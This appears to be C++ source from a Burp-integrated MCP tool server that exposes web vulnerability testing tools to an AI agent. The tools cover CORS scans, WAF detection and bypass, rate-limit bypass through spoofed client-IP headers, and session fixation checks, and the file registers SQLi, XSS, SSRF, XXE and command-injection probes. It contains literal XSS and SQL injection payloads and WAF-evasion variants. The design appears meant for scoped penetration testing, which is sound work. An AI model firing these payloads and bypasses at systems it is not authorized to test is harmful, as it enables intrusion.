        auto r = tool_cors_test(p);
        json item = r.data;
        item["success"] = r.success;
        evidence = evidence || (r.data.contains("vulnerable") && r.data["vulnerable"].is_boolean() && r.data["vulnerable"].get<bool>());
        attempts.push_back(std::move(item));
        ++count;
    }
    json d;
    d["attempts"] = std::move(attempts);
    d["vulnerable"] = evidence;
    d["evidence_summary"] = evidence ? "one_or_more_origins_permitted" : "no_tested_origin_permitted";
    return tool_result_t::ok(evidence ? "CORS origin scan found permissive behavior" : "CORS origin scan found no permissive behavior", d);
}

std::vector<std::string> waf_signatures(const exchange_t& ex)
{
    std::vector<std::string> out;
    for (const auto& h : ex.resp_headers) {
        const std::string n = lower_ascii(h.first);
        const std::string v = lower_ascii(h.second);
        if (n.find("cf-") == 0 || v.find("cloudflare") != std::string::npos) out.push_back("cloudflare");
        if (n.find("x-sucuri") != std::string::npos || v.find("sucuri") != std::string::npos) out.push_back("sucuri");
        if (n.find("x-akamai") != std::string::npos || v.find("akamai") != std::string::npos) out.push_back("akamai");
        if (n.find("x-waf") != std::string::npos || v.find("mod_security") != std::string::npos) out.push_back("generic-waf");
    }
    const std::string body = lower_ascii(body_string(ex));
    if (body.find("access denied") != std::string::npos || body.find("request blocked") != std::string::npos ||
        body.find("mod_security") != std::string::npos || body.find("web application firewall") != std::string::npos)
        out.push_back("block-page");
    std::sort(out.begin(), out.end());
    out.erase(std::unique(out.begin(), out.end()), out.end());
    return out;
}

bool response_blocked_like(const exchange_t& ex)
{
    if (ex.status_code == 403 || ex.status_code == 406 || ex.status_code == 429 || ex.status_code == 501)
        return true;
    return !waf_signatures(ex).empty();
}

tool_result_t tool_waf_detect(const json& params)
{
    prepared_request_t r;
    std::string err;
    if (!prepare_request(params, r, err, "GET"))
        return param_error(err, "url");
    const std::string param = string_param(params, "param_name", "q");
    auto baseline = send_raw(r, r.target.path_query, r.body, infer_content_type(r));
    mutation_t m;
    auto attack = send_with_param(r, param, "'\"><script>alert(1)</script> UNION SELECT NULL--", params, &m);
    json d;
    d["request"] = request_summary(r, m.path_query.empty() ? r.target.path_query : m.path_query);
    d["param_name"] = param;
    if (!baseline.ok || !attack.ok) {
        d["baseline_error"] = baseline.error;
        d["attack_error"] = attack.error;
        return tool_result_t::error("WAF detection request failed", "transport_failed", d);
    }
    auto base_sigs = waf_signatures(baseline.exchange);
    auto attack_sigs = waf_signatures(attack.exchange);
    const bool blocked = response_blocked_like(attack.exchange) && !response_blocked_like(baseline.exchange);
    d["baseline_response"] = response_summary(baseline.exchange);
    d["attack_response"] = response_summary(attack.exchange);
    d["baseline_signatures"] = base_sigs;
    d["attack_signatures"] = attack_sigs;
    d["attack_blocked"] = blocked;
    d["detected"] = blocked || !base_sigs.empty() || !attack_sigs.empty();
    d["evidence_summary"] = d["detected"].get<bool>() ? "waf_signature_or_block_delta_observed" : "no_waf_indicator";
    return tool_result_t::ok(d["detected"].get<bool>() ? "WAF indicators observed" : "No WAF indicators observed", d);
}

std::string waf_variant(const std::string& payload, const std::string& technique)
{
    if (technique == "encoding")
        return aida::burp::insertion_points::url_encode(payload);
    if (technique == "case")
        return "<ScRiPt>alert(1)</ScRiPt>";
    if (technique == "comment")
        return "UN/**/ION SEL/**/ECT NULL";
    if (technique == "double_url")
        return aida::burp::insertion_points::url_encode(aida::burp::insertion_points::url_encode(payload));
    if (technique == "overflow")
        return std::string(2048, 'A') + payload;
    return payload;
}

tool_result_t tool_waf_bypass_test(const json& params)
{
    prepared_request_t r;
    std::string err;
    if (!prepare_request(params, r, err, "GET"))
        return param_error(err, "url");
    const std::string param = string_param(params, "param_name");
    if (param.empty())
        return param_error("param_name is required", "param_name", "missing_required");
    const std::string payload = string_param(params, "payload", "<script>alert(1)</script>");
    std::vector<std::string> techniques;
    if (params.contains("techniques") && params["techniques"].is_array()) {
        for (const auto& v : params["techniques"]) {
            if (v.is_string() && techniques.size() < 8)
                techniques.push_back(lower_ascii(v.get<std::string>()));
        }
    }
    if (techniques.empty())
        techniques = {"encoding", "case", "comment", "double_url", "overflow"};
    json attempts = json::array();
    bool bypass = false;
    for (const auto& technique : techniques) {
        if (call_expired()) break;
        mutation_t m;
        auto sr = send_with_param(r, param, waf_variant(payload, technique), params, &m);
        json a;
        a["technique"] = technique;
        a["param_location"] = m.location;
        if (sr.ok) {
            const bool blocked = response_blocked_like(sr.exchange);
            a["response"] = response_summary(sr.exchange);
            a["blocked"] = blocked;
            if (!blocked && sr.exchange.status_code >= 200 && sr.exchange.status_code < 400)
                bypass = true;
        } else {
            a["error"] = sr.error;
        }
        attempts.push_back(std::move(a));
    }
    json d;
    d["request"] = request_summary(r, r.target.path_query);
    d["param_name"] = param;
    d["payload_hash"] = hash_string(payload);
    d["attempts"] = std::move(attempts);
    d["bypass_candidate"] = bypass;
    d["evidence_summary"] = bypass ? "variant_accepted_without_block_indicator" : "no_bypass_variant_accepted";
    return tool_result_t::ok(bypass ? "WAF bypass candidate observed" : "No WAF bypass candidate observed", d);
}

tool_result_t tool_ratelimit_test(const json& params)
{
    prepared_request_t r;
    std::string err;
    if (!prepare_request(params, r, err, "GET"))
        return param_error(err, "url");
    const int count = clamp_int_param(params, "count", 10, 1, 30);
    const int interval_ms = clamp_int_param(params, "interval_ms", 0, 0, 5000);
    json responses = json::array();
    int limited = 0;
    std::map<int, int> status_counts;
    for (int i = 0; i < count && !call_expired(); ++i) {
        auto sr = send_raw(r, r.target.path_query, r.body, infer_content_type(r));
        json item;
        item["index"] = i;
        if (sr.ok) {
            item["response"] = response_summary(sr.exchange);
            const bool is_limited = sr.exchange.status_code == 429 || header_value(sr.exchange.resp_headers, "Retry-After").has_value();
            item["rate_limited"] = is_limited;
            if (is_limited) ++limited;
            ++status_counts[sr.exchange.status_code];
        } else {
            item["error"] = sr.error;
        }
        responses.push_back(std::move(item));
        if (interval_ms > 0 && i + 1 < count)
            bounded_sleep_ms(interval_ms);
    }
    json dist = json::object();
    for (const auto& kv : status_counts)
        dist[std::to_string(kv.first)] = kv.second;
    json d;
    d["request"] = request_summary(r, r.target.path_query);
    d["attempted"] = responses.size();
    d["rate_limited_count"] = limited;
    d["status_distribution"] = std::move(dist);
    d["responses"] = std::move(responses);
    d["rate_limit_observed"] = limited > 0;
    d["evidence_summary"] = limited > 0 ? "429_or_retry_after_observed" : "no_rate_limit_signal";
    return tool_result_t::ok(limited > 0 ? "Rate limit observed" : "No rate limit observed", d);
}

tool_result_t tool_ratelimit_bypass_check(const json& params)
{
    prepared_request_t r;
    std::string err;
    if (!prepare_request(params, r, err, "GET"))
        return param_error(err, "url");
    std::vector<std::string> techniques;
    if (params.contains("bypass_techniques") && params["bypass_techniques"].is_array()) {
        for (const auto& v : params["bypass_techniques"]) {
            if (v.is_string() && techniques.size() < 6)
                techniques.push_back(lower_ascii(v.get<std::string>()));
        }
    }
    if (techniques.empty())
        techniques = {"x-forwarded-for", "x-real-ip", "client-ip", "x-originating-ip"};
    const int per_technique = clamp_int_param(params, "per_technique_count", 4, 1, 10);
    json attempts = json::array();
    bool bypass = false;
    for (const auto& technique : techniques) {
        int limited = 0;
        int success = 0;
        for (int i = 0; i < per_technique && !call_expired(); ++i) {
            std::vector<header_t> extra;
            const std::string value = "203.0.113." + std::to_string(10 + i);
            if (technique == "x-forwarded-for") extra.push_back({"X-Forwarded-For", value});
            else if (technique == "x-real-ip") extra.push_back({"X-Real-IP", value});
            else if (technique == "client-ip") extra.push_back({"Client-IP", value});
            else if (technique == "x-originating-ip") extra.push_back({"X-Originating-IP", value});
            else extra.push_back({technique, value});
            auto sr = send_raw(r, r.target.path_query, r.body, infer_content_type(r), extra);
            if (sr.ok) {
                const bool is_limited = sr.exchange.status_code == 429 || header_value(sr.exchange.resp_headers, "Retry-After").has_value();
                if (is_limited) ++limited;
                if (sr.exchange.status_code >= 200 && sr.exchange.status_code < 400) ++success;
            }
        }
        json item;
        item["technique"] = technique;
        item["sent"] = per_technique;
        item["rate_limited_count"] = limited;
        item["success_count"] = success;
        item["bypass_candidate"] = success > 0 && limited == 0;
        bypass = bypass || item["bypass_candidate"].get<bool>();
        attempts.push_back(std::move(item));
    }
    json d;
    d["request"] = request_summary(r, r.target.path_query);
    d["attempts"] = std::move(attempts);
    d["bypass_candidate"] = bypass;
    d["evidence_summary"] = bypass ? "header_variant_success_without_rate_limit" : "no_rate_limit_bypass_candidate";
    return tool_result_t::ok(bypass ? "Rate limit bypass candidate observed" : "No rate limit bypass candidate observed", d);
}

std::optional<std::pair<std::string, std::string>> parse_cookie_value(const std::string& set_cookie, const std::string& wanted)
{
    const size_t eq = set_cookie.find('=');
    if (eq == std::string::npos)
        return std::nullopt;
    const std::string name = trim_copy(set_cookie.substr(0, eq));
    const size_t semi = set_cookie.find(';', eq + 1);
    const std::string value = semi == std::string::npos ? set_cookie.substr(eq + 1) : set_cookie.substr(eq + 1, semi - eq - 1);
    if (!wanted.empty() && name != wanted)
        return std::nullopt;
    return std::make_pair(name, value);
}

json cookie_fingerprint(const std::string& name, const std::string& value)
{
    return {{"name", name}, {"value_length", value.size()}, {"value_hash", hash_string(value)}};
}

std::optional<std::pair<std::string, std::string>> first_cookie_named(const exchange_t& ex, const std::string& name)
{
    for (const auto& h : header_values(ex.resp_headers, "Set-Cookie")) {
        auto parsed = parse_cookie_value(h, name);
        if (parsed.has_value())
            return parsed;
    }
    return std::nullopt;
}

std::string credentials_body(const json& creds, json& key_summary)
{
    std::string body;
    bool first = true;
    key_summary = json::array();
    for (auto it = creds.begin(); it != creds.end(); ++it) {
        std::string value;
        if (it.value().is_string()) value = it.value().get<std::string>();
        else if (it.value().is_number_integer()) value = std::to_string(it.value().get<long long>());
        else if (it.value().is_number_unsigned()) value = std::to_string(it.value().get<unsigned long long>());
        else if (it.value().is_boolean()) value = it.value().get<bool>() ? "true" : "false";
        else continue;
        if (!first) body += "&";
        first = false;
        body += aida::burp::insertion_points::url_encode(it.key());
        body += "=";
        body += aida::burp::insertion_points::url_encode(value);
        key_summary.push_back({{"name", it.key()}, {"sensitive", is_sensitive_name(it.key())}, {"value_length", value.size()}, {"value_hash", hash_string(value)}});
    }
    return body;
}

tool_result_t tool_session_test_fixation(const json& params)
{
    if (!params.contains("credentials") || !params["credentials"].is_object())
        return param_error("credentials object is required", "credentials", "missing_required");
    const std::string cookie_name = string_param(params, "session_cookie_name");
    if (cookie_name.empty())
        return param_error("session_cookie_name is required", "session_cookie_name", "missing_required");
    json key_summary;
    std::string login_body = credentials_body(params["credentials"], key_summary);
    json login_params = params;
    login_params["url"] = string_param(params, "login_url");
    login_params["method"] = "POST";
    login_params["body"] = login_body;
    login_params["content_type"] = "application/x-www-form-urlencoded";
    if (!login_params["url"].is_string() || login_params["url"].get<std::string>().empty())
        return param_error("login_url is required", "login_url", "missing_required");
    std::optional<std::pair<std::string, std::string>> pre_cookie;
    json d;
    d["credential_fields"] = key_summary;
    if (params.contains("pre_login_url") && params["pre_login_url"].is_string()) {
        json pre_params = params;
        pre_params["url"] = params["pre_login_url"];
        pre_params["method"] = "GET";
        prepared_request_t pre;
        std::string err;
        if (!prepare_request(pre_params, pre, err, "GET"))
            return param_error(err, "pre_login_url");
        auto sr = send_raw(pre, pre.target.path_query, std::string(), std::string());
        if (sr.ok) {
            pre_cookie = first_cookie_named(sr.exchange, cookie_name);
            d["pre_login_response"] = response_summary(sr.exchange);
            if (pre_cookie.has_value()) {
                d["pre_login_cookie"] = cookie_fingerprint(pre_cookie->first, pre_cookie->second);
            }
        }
    }
    prepared_request_t login;
    std::string err;
    if (!prepare_request(login_params, login, err, "POST"))
        return param_error(err, "login_url");
    if (pre_cookie.has_value())
        set_header(login.headers, "Cookie", pre_cookie->first + "=" + pre_cookie->second);
    auto login_result = send_raw(login, login.target.path_query, login.body, infer_content_type(login));
    if (!login_result.ok) {
        d["login_error"] = login_result.error;
        return tool_result_t::error("session fixation login request failed", "transport_failed", d);
    }
    auto post_cookie = first_cookie_named(login_result.exchange, cookie_name);
    d["login_request"] = request_summary(login, login.target.path_query);
    d["login_response"] = response_summary(login_result.exchange);
    if (post_cookie.has_value())
        d["post_login_cookie"] = cookie_fingerprint(post_cookie->first, post_cookie->second);
    const bool fixed = pre_cookie.has_value() && post_cookie.has_value() && pre_cookie->second == post_cookie->second;
    const bool no_new_cookie = pre_cookie.has_value() && !post_cookie.has_value();
    d["fixation_evidence"] = fixed;
    d["no_rotation_signal"] = no_new_cookie;
    d["vulnerable"] = fixed || no_new_cookie;
    d["evidence_summary"] = fixed ? "same_session_cookie_after_login" : (no_new_cookie ? "no_session_cookie_rotation_observed" : "session_cookie_rotated_or_absent_before_login");
    return tool_result_t::ok(d["vulnerable"].get<bool>() ? "Session fixation evidence observed" : "No session fixation evidence observed", d);
}

tool_result_t tool_session_test_no_rotate(const json& params)
{
    prepared_request_t r;
    std::string err;
    if (!prepare_request(params, r, err, "GET"))
        return param_error(err, "url");
    const std::string cookie_name = string_param(params, "session_cookie_name", "session");
    auto before = send_raw(r, r.target.path_query, r.body, infer_content_type(r));
    json d;
    d["request"] = request_summary(r, r.target.path_query);
    if (!before.ok) {
        d["before_error"] = before.error;
        return tool_result_t::error("session rotation baseline request failed", "transport_failed", d);
    }
    prepared_request_t after = r;
    if (params.contains("after_url") && params["after_url"].is_string()) {
        if (!parse_target_url(params["after_url"].get<std::string>(), after.target, err))
            return param_error(err, "after_url");
    }
    auto c1 = first_cookie_named(before.exchange, cookie_name);
    if (c1.has_value())
        set_header(after.headers, "Cookie", c1->first + "=" + c1->second);
    auto second = send_raw(after, after.target.path_query, after.body, infer_content_type(after));
    if (!second.ok) {
        d["after_error"] = second.error;
        return tool_result_t::error("session rotation follow-up request failed", "transport_failed", d);
    }
    auto c2 = first_cookie_named(second.exchange, cookie_name);
    d["before_response"] = response_summary(before.exchange);
    d["after_response"] = response_summary(second.exchange);
    if (c1.has_value()) d["before_cookie"] = cookie_fingerprint(c1->first, c1->second);
    if (c2.has_value()) d["after_cookie"] = cookie_fingerprint(c2->first, c2->second);
    const bool no_rotate = c1.has_value() && (!c2.has_value() || c1->second == c2->second);
    d["no_rotation_observed"] = no_rotate;
    d["vulnerable"] = no_rotate;
    d["evidence_summary"] = no_rotate ? "session_cookie_not_rotated_between_requests" : "session_cookie_rotated_or_not_set";
    return tool_result_t::ok(no_rotate ? "Session no-rotate evidence observed" : "Session rotation observed or not testable", d);
}

void register_tool(mcp_standalone::server_t& srv,
                   const std::string& name,
                   const std::string& description,
                   std::vector<compat_param_t> params,
                   std::function<tool_result_t(const json&)> handler,
                   bool read_only)
{
    register_compat(srv, {name, "web_vuln", description, std::move(params), std::move(handler), read_only});
}

std::vector<compat_param_t> base_params()
{
    return {
        {"url", "string", "HTTP or HTTPS target URL.", true},
        {"method", "string", "HTTP method.", false},
        {"headers", "object|array|string", "Optional request headers. Sensitive values are sent but not returned in evidence.", false},
        {"body", "string", "Optional request body, capped at 65536 bytes.", false},
        {"content_type", "string", "Optional Content-Type for body requests.", false},
        {"scope_only", "boolean", "Enforce Burp scope; defaults true.", false},
        {"timeout_ms", "number", "Per-request timeout, clamped to the MCP deadline.", false}
    };
}

std::vector<compat_param_t> param_test_params()
{
    auto p = base_params();
    p.push_back({"param_name", "string", "Parameter name to test.", true});
    p.push_back({"param_location", "string", "query|body|json|auto; defaults auto.", false});
    p.push_back({"original_value", "string", "Baseline value to seed when the parameter is missing.", false});
    p.push_back({"max_payloads", "number", "Payload cap.", false});
    p.push_back({"wait_ms", "number", "Scanner wait budget for delegated scanner wrappers.", false});
    return p;
}

}

void register_web_vuln_tools(mcp_standalone::server_t& srv)
{
    aida::burp::initialize();
    diag::log_tagged("web_vuln", "register_web_vuln_tools entry");

    register_tool(srv, "aida.web.sqli.detect", "Detect SQL injection through the active scanner SQLi module.", param_test_params(), tool_sqli_detect, false);
    register_tool(srv, "aida.web.sqli.union_extract", "Run bounded UNION SQLi extraction probes and return response evidence.", param_test_params(), tool_sqli_union_extract, false);
    register_tool(srv, "aida.web.sqli.boolean_extract", "Run true/false boolean SQLi probes and compare response deltas.", param_test_params(), tool_sqli_boolean_extract, false);
    register_tool(srv, "aida.web.sqli.time_extract", "Run bounded time-based SQLi probes and compare latency deltas.", param_test_params(), tool_sqli_time_extract, false);

    register_tool(srv, "aida.web.xss.detect_reflected", "Test a parameter for reflected XSS with bounded payloads.", param_test_params(), tool_xss_detect_reflected, false);
    register_tool(srv, "aida.web.xss.detect_stored", "Submit a stored-XSS marker and verify whether it appears on a follow-up fetch.", param_test_params(), tool_xss_detect_stored, false);
    register_tool(srv, "aida.web.xss.generate_payloads", "Generate bounded XSS payloads from AiDA's payload library.", {{"context", "string", "Payload context hint.", false}, {"max_payloads", "number", "Payload cap.", false}}, tool_xss_generate_payloads, true);

    register_tool(srv, "aida.web.csrf.check_token", "Fetch a page and summarize CSRF token coverage without returning token values.", base_params(), tool_csrf_check_token, false);
    register_tool(srv, "aida.web.csrf.generate_poc", "Generate a CSRF form PoC with sensitive field values redacted.", {{"url", "string", "Target form action URL.", true}, {"method", "string", "Form method.", false}, {"params", "object", "Form fields.", false}}, tool_csrf_generate_poc, true);

    register_tool(srv, "aida.web.ssrf.test", "Test SSRF with collaborator or provided callback URL.", param_test_params(), tool_ssrf_test, false);
    register_tool(srv, "aida.web.ssrf.scan_internal", "Probe a bounded list of internal SSRF destinations through a target parameter.", param_test_params(), tool_ssrf_scan_internal, false);

    register_tool(srv, "aida.web.xxe.test", "Send a bounded XXE XML probe and check response plus collaborator evidence.", base_params(), tool_xxe_test, false);
    register_tool(srv, "aida.web.xxe.generate_payloads", "Generate bounded XXE payloads for direct and OOB testing.", {{"callback_url", "string", "Collaborator callback URL used in generated payloads.", false}, {"max_payloads", "number", "Payload cap.", false}}, tool_xxe_generate_payloads, true);

    register_tool(srv, "aida.web.ssti.detect", "Test SSTI with arithmetic payloads and response evidence.", param_test_params(), tool_ssti_detect, false);
    register_tool(srv, "aida.web.ssti.generate_payloads", "Generate SSTI payloads from AiDA's payload library.", {{"max_payloads", "number", "Payload cap.", false}}, tool_ssti_generate_payloads, true);

    register_tool(srv, "aida.web.path_traversal.test", "Test path traversal or LFI with bounded file indicator payloads.", param_test_params(), tool_path_traversal_test, false);
    register_tool(srv, "aida.web.path_traversal.generate_payloads", "Generate path traversal payloads from AiDA's payload library.", {{"platform", "string", "all|linux|windows.", false}, {"max_payloads", "number", "Payload cap.", false}}, tool_path_traversal_generate_payloads, true);

    register_tool(srv, "aida.web.open_redirect.test", "Test a redirect parameter for external Location header control.", param_test_params(), tool_open_redirect_test, false);
    register_tool(srv, "aida.web.cmdi.detect", "Detect command injection through the active scanner CMDi module.", param_test_params(), tool_cmdi_detect, false);
    register_tool(srv, "aida.web.deser.test", "Detect insecure deserialization through the active scanner deserialization module.", param_test_params(), tool_deser_test, false);
    register_tool(srv, "aida.web.deser.generate_payloads", "Generate non-executing deserialization canary and format probes.", {{"format", "string", "java|php|python|dotnet.", true}, {"max_payloads", "number", "Payload cap.", false}}, tool_deser_generate_payloads, true);
    register_tool(srv, "aida.web.race.test", "Run the active scanner race-condition wrapper with bounded wait and evidence summary.", base_params(), tool_race_test, false);
    register_tool(srv, "aida.web.logic.test_idor", "Detect IDOR through the active scanner IDOR module.", param_test_params(), tool_logic_test_idor, false);
    register_tool(srv, "aida.web.logic.test_price_tamper", "Test price or amount tampering by comparing baseline and tampered responses.", param_test_params(), tool_logic_test_price_tamper, false);

    register_tool(srv, "aida.cors.test", "Test CORS behavior for a supplied Origin header.", base_params(), tool_cors_test, false);
    register_tool(srv, "aida.cors.scan_origins", "Test multiple Origin values and summarize permissive CORS behavior.", base_params(), tool_cors_scan_origins, false);
    register_tool(srv, "aida.waf.detect", "Detect WAF signatures and attack-response blocking deltas.", param_test_params(), tool_waf_detect, false);
    register_tool(srv, "aida.waf.bypass_test", "Try bounded WAF bypass variants and summarize accepted candidates.", param_test_params(), tool_waf_bypass_test, false);
    register_tool(srv, "aida.ratelimit.test", "Send a bounded request burst and summarize rate-limit evidence.", base_params(), tool_ratelimit_test, false);
    register_tool(srv, "aida.ratelimit.bypass_check", "Check bounded header-based rate-limit bypass techniques.", base_params(), tool_ratelimit_bypass_check, false);
    register_tool(srv, "aida.session.test_fixation", "Test whether a pre-login session cookie survives login without returning cookie or credential values.", {{"login_url", "string", "Login endpoint URL.", true}, {"pre_login_url", "string", "Optional endpoint to obtain an initial session cookie.", false}, {"credentials", "object", "Credential fields to submit; values are hashed in results.", true}, {"session_cookie_name", "string", "Session cookie name.", true}, {"headers", "object|array|string", "Optional request headers.", false}, {"scope_only", "boolean", "Enforce Burp scope; defaults true.", false}, {"timeout_ms", "number", "Per-request timeout.", false}}, tool_session_test_fixation, false);
    register_tool(srv, "aida.session.test_no_rotate", "Check whether a session cookie rotates between two bounded requests.", base_params(), tool_session_test_no_rotate, false);

    diag::log_tagged("web_vuln", "register_web_vuln_tools complete");
}

}
